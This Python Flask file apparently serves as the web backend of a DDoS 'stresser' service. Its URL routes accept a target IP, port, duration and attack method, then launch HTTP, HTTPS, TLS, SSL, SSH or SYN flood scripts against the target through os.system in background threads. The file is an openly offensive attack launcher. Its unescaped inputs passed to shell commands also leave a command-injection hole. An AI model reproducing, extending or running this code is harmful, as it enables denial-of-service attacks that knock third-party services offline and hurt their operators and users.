from flask import Flask
import os,threading

methods = []

app = Flask(__name__)

def L7(IP,PORT,TIME,METHODS,TYPE):
  if METHODS.upper() == 'HTTP_HEX1629':
   print("SUS")
   os.system(f'python3 pyf.py OWN1 {IP} {PORT} {TIME} {TIME} 250 250 {TYPE} 1')
  elif METHODS.upper() == 'HTTPS_HEX1629':
    os.system(f'python3 https.py https://{IP}/ {PORT} {TIME} {TYPE}')
  elif METHODS.upper() == 'TLS_HEX1629':
    os.system(f'python3 tls.py https://{IP}/ {PORT} {TIME} {TYPE}')
  elif METHODS.upper() == 'SSL_HEX1629':
    os.system(f'python3 ssl.py https://{IP}/ {PORT} {TIME} {TYPE}')

def L4(IP,PORT,TIME,METHODS):
  if METHODS.upper() == 'SSH_HEX1629':
    os.system(f'python3 ssh.py {IP} {PORT} {TIME} 200000 {TIME} {TIME}')
  elif METHODS.upper() == 'SYN_HEX1629':
    os.system(f'python3 syn.py {IP} {PORT} {TIME} 250')

@app.route("/TARGET=<IP>&PORT=<NUMBER>&TIME=<THREAD>&PACKET=<HTTP>&METHODS=<METHODS2>")
def DOS_L7(IP,NUMBER,THREAD,HTTP,METHODS2):
  if IP is None or NUMBER is None or THREAD is None or HTTP is None or METHODS2 is None:
    return 'FAILED'
  else:
   if int(THREAD) < 70 or int(THREAD) == 70:
     if METHODS2.upper() == 'HTTP_HEX1629':
         threading.Thread(target=L7,args=(IP,NUMBER,THREAD,METHODS2,HTTP)).start()
         return f'DONE --> HTTP FLOOD {IP}:{NUMBER}'
     elif METHODS2.upper() == 'HTTPS_HEX1629':
        threading.Thread(target=L7,args=(IP,NUMBER,THREAD,METHODS2,HTTP)).start()
        return f'DONE --> HTTPS FLOOD {IP} . . .'
     elif METHODS2.upper() == 'TLS_HEX1629':
        threading.Thread(target=L7,args=(IP,NUMBER,THREAD,METHODS2,HTTP)).start()
        return f'DONE --> TLS FLOOD {IP} . . .'
     elif METHODS2.upper() == 'SSL_HEX1629':
        threading.Thread(target=L7,args=(IP,NUMBER,THREAD,METHODS2,HTTP)).start()
        return f'DONE --> SSL FLOOD {IP} . . .'
     else:
       return 'METHODS IS NOT FOUND (HTTP_HEX1629 HTTPS_HEX1629 SSL_HEX1629 TLS_HEX1629)'
   else:
     return 'YOU TIME IT HIGH'

@app.route("/IP=<IP2>&PORT=<NUMBER>&TIME=<THREAD>&METHODS=<METHODS2>")
def DOS_L4(IP2,NUMBER,THREAD,METHODS2):
  if IP2 is None or NUMBER is None or THREAD is None or METHODS2 is None:
    return 'FAILED'
  else:
   if int(THREAD) < 70 or int(THREAD) == 70:
     if METHODS2.upper() == 'SSH_HEX1629':
         threading.Thread(target=L4,args=(IP2,NUMBER,THREAD,METHODS2)).start()
         return f'DONE --> SSH FLOOD {IP2}:{NUMBER}'
     elif METHODS2.upper() == 'SYN_HEX1629':
         threading.Thread(target=L4,args=(IP2,NUMBER,THREAD,METHODS2)).start()
         return f'DONE --> SYN FLOOD {IP2}:{NUMBER}'
     else:
       return 'METHODS IS NOT FOUND (SSH_HEX1629 SYN_HEX1629)'
   else:
     return 'YOU TIME IT HIGH'

@app.route("/")
def hello():
    f = open('index.html','r')
    data = f.read()
    f.close()
    return data

@app.route("/custom_error=<ERROR_TYPE>&<REASON>")
def invaild_error(ERROR_TYPE,REASON):
    f = open('page_error.html','r')
    data = f.read().replace('XXX',ERROR_TYPE).replace('CODE',REASON)
    f.close()
    return data

@app.errorhandler(405)
def method_not_allowed_error(error):
    f = open('page_error.html','r')
    data = f.read().replace('XXX','405').replace('CODE','HEY I THINK YOU METHODS NOT SUPPORT IT IN MY WEBSITE')
    f.close()
    return data

@app.errorhandler(500)
def internal_server_error(error):
  f = open('page_error2.html','r')
  data = f.read().replace('XXX','500').replace('REASON','INTERNAL SERVER ERROR OCCURRED').replace('HELP','WEBSITE CAN RECV YOU REQUEST BUT PROCESS REQUEST IT FAILED NOW')
  f.close()
  return data
  
@app.errorhandler(404)
def page_not_found(e):
  f = open('page_error.html','r')
  data = f.read().replace('XXX','404').replace('CODE','UHH DUDE I THINK MY WEBSITE NOT HAVE THIS PAGE')
  f.close()
  return data

if __name__ == "__main__":
   app.run('0.0.0.0', 5000)